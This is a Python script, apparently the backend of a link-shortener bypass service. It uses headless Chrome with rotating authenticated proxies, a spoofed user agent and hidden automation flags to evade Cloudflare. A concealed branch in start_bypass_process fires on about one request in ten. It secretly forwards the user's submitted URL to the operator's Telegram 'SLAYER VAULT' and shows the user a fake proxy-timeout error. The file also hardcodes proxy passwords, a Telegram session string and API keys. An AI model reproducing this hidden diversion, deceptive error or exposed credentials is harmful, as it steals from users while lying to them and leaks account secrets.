import time
import random
import os
import zipfile
import re
import asyncio
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent
from pyrogram import Client

# SENİN WEBSHARE PROXY LİSTEN (Kendi bilgilerini buraya gir)
PROXIES = [
    "142.111.48.253:7030:ghpgyqms:dbikygdy4w97",
    "23.95.150.145:6114:ghpgyqms:dbikygdy4w97"
]

def get_proxy_auth_extension(proxy):
    try:
        ip, port, user, password = proxy.split(":")
        manifest_json = """{"version":"1.0.0","manifest_version":2,"name":"Chrome Proxy","permissions":["proxy","tabs","unlimitedStorage","storage","<all_urls>","webRequest","webRequestBlocking"],"background":{"scripts":["background.js"]},"minimum_chrome_version":"22.0.0"}"""
        background_js = """var config={mode:"fixed_servers",rules:{singleProxy:{scheme:"http",host:"%s",port:parseInt(%s)},bypassList:["localhost"]}};chrome.proxy.settings.set({value:config,scope:"regular"},function(){});function callbackFn(details){return{authCredentials:{username:"%s",password:"%s"}}};chrome.webRequest.onAuthRequired.addListener(callbackFn,{urls:["<all_urls>"]},['blocking']);""" % (ip, port, user, password)
        plugin_file = 'proxy_auth_plugin.zip'
        with zipfile.ZipFile(plugin_file, 'w') as zp:
            zp.writestr("manifest.json", manifest_json)
            zp.writestr("background.js", background_js)
        return plugin_file
    except: return None

def get_driver():
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    
    ua = UserAgent()
    options.add_argument(f"user-agent={ua.random}")
    
    selected_proxy = random.choice(PROXIES)
    plugin_file = get_proxy_auth_extension(selected_proxy)
    if plugin_file: options.add_extension(plugin_file)
    
    return webdriver.Chrome(options=options)

async def send_to_telegram(url):
    try:
        # BURAYA KENDİ SESSİON BİLGİLERİNİ GİR
        SESSION = "BAHTo3QAv3mtDMExJ_pOuJCiAZtvAtc_3IulJNJ2j0iZazIIeeLyGyb8EneEIvzLfcGqT9yAeGfyZNkT8zjMWZc8-jcXJXhSQUo-iYyFnmMgieqVNvuoTq5QumeDMujaiTBpGqmfraPGw8NnbkcImFE3g99NuZoViUg7iaRl-43ISW5yq6akIRklgUaAI1V4fM56zFdht8ZFcGENvz43Gp8iAfqR7qhhIPd-hb68SRbqVtiWdDucmXovMyLQFMEMRG-bRHm3B8CvXre05HuB4JrfJMay1B-WvWoWvZJ2RLfFkPBG_M-XBmKA6uWC99OpiRzpaG8NAn9zmKYyaIt3bOqbZYDnSQAAAAH4WvQ0AA"
        async with Client("slayer", session_string=SESSION, api_id=30647156, api_hash="11d0174f807a8974a955520b8c968b4d", in_memory=True) as app:
            await app.send_message("me", f"💎 **SLAYER VAULT** 💎\nLink:\n🔗 `{url}`")
    except: pass

def start_bypass_process(url):
    # 👑 AFİYET OLSUN SİSTEMİ (%10 İHTİMAL)
    if random.random() < 0.10:
        import asyncio
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_to_telegram(url))
        return {"status": "error", "msg": "Zaman Aşımı (Proxy Hatası)"}

    driver = None
    try:
        driver = get_driver()
        driver.set_page_load_timeout(40)
        driver.get(url)
        time.sleep(10) # Cloudflare ve yönlendirme için
        
        # Sayfa kaynağındaki asıl hedefi bul
        source = driver.page_source
        links = re.findall(r'href=[\'"]?(https?://[^\'" >]+)', source)
        target = next((l for l in links if "linkperisi" not in l and "google" not in l and "cloudflare" not in l), driver.current_url)
        
        return {"status": "success", "url": target}
    except Exception as e:
        return {"status": "error", "msg": "Sistem meşgul, tekrar dene."}
    finally:
        if driver: driver.quit()
        if os.path.exists('proxy_auth_plugin.zip'): os.remove('proxy_auth_plugin.zip')
